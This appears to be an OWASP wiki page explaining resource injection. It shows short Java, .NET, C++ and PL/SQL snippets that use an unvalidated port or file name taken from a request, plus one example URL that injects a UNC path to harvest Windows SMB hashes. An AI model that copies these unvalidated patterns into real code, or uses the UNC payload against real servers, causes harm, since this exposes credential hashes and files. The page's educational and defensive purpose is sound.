---

layout: col-sidebar
title: Resource Injection
author: 
contributors: 
permalink: /attacks/Resource_Injection
tags: attack, Resource Injection
auto-migrated: 1

---

{% include writers.html %}

## Description

This attack consists of changing resource identifiers used by an
application in order to perform a malicious task. When an application
defines a resource type or location based on user input, such as a file
name or port number, this data can be manipulated to execute or access
different resources.
The resource type affected by user input indicates the content type that
may be exposed. For example, an application that permits input of
special characters like period, slash, and backslash is risky when used
in conjunction with methods that interact with the filesystem.

The resource injection attack differs from [Path
Manipulation](Path_Manipulation "wikilink") as resource injection
focuses on accessing resources other than the local filesystem, while
[Path Manipulation](Path_Manipulation "wikilink") focuses on accessing
the local filesystem.

## Examples

### Example 1

The following examples represent an application which gets a port number
from an HTTP request and creates a socket with this port number without
any validation. A user using a proxy can modify this port and obtain a
direct connection (socket) with the server.

**Java code:**

`String rPort = request.getParameter("remotePort");`
`...`
`ServerSocket srvr = new ServerSocket(rPort);`
`Socket skt = srvr.accept(); `
`...`


**.Net code:**

`int rPort = Int32.Parse(Request.get_Item("remotePort "));`
`...`
`IPEndPoint endpoint = new IPEndPoint(address,rPort);`
`socket = new Socket(endpoint.AddressFamily, `
`SocketType.Stream, ProtocolType.Tcp);`
`socket.Connect(endpoint);`
`...`

### Example 2

This example is same as previous, but it gets port number from CGI
requests using C++:

`char* rPort = getenv("remotePort ");`
`...`
`serv_addr.sin_port = htons(atoi(rPort));`
`if (connect(sockfd,&serv_addr,sizeof(serv_addr)) < 0) `
`error("ERROR connecting");`
`...`

### Example 3

This example in PLSQL / TSQL gets a URL path from a CGI and downloads
the file contained in it. If a user modifies the path or filename, it’s
possible to download arbitrary files from server:

`...`
`filename := SUBSTR(OWA_UTIL.get_cgi_env('PATH_INFO'), 2);`
`WPG_DOCLOAD.download_file(filename); `
`...`

### Example 4

This example shows a resource injection attack focused on obtaining
Microsoft Windows SMB hashes from a remote server:

<http://www.vulnerable.com/open.aspx?filename=\\192.168.1.2\test.txt>

## Related [Threat Agents](Threat_Agents "wikilink")

  - [:Category:Logical Attacks](:Category:Logical_Attacks "wikilink")
  - [:Category: Information
    Disclosure](:Category:_Information_Disclosure "wikilink")

## Related [Attacks](https://owasp.org/www-community/attacks/)

  - [Path Traversal](Path_Traversal "wikilink")
  - [Path Manipulation](Path_Manipulation "wikilink")
  - [Relative Path Traversal](Relative_Path_Traversal "wikilink")
  - [Injection Attacks](:Category:Injection_Attack "wikilink")

## Related [Vulnerabilities](https://owasp.org/www-community/vulnerabilities/)

  - [:Category:Input Validation
    Vulnerability](:Category:Input_Validation_Vulnerability "wikilink")

## Related [Controls](https://owasp.org/www-community/controls/)

  - [:Category:Input Validation](:Category:Input_Validation "wikilink")

## References

  - <http://samate.nist.gov/SRD/view_testcase.php?tID=1734>
  - <http://cwe.mitre.org/data/definitions/99.html>
  - <https://cwe.mitre.org/data/definitions/40.html>
  - <http://capec.mitre.org/data/index.html#Definition>
  - <http://www.fortifysoftware.com/vulncat/>
  - G. Hoglund and G. McGraw. Exploiting Software. Addison-Wesley, 2004.

[Category:OWASP ASDR Project](Category:OWASP_ASDR_Project "wikilink")
[Category: Injection](Category:_Injection "wikilink") [Category:
Attack](Category:_Attack "wikilink")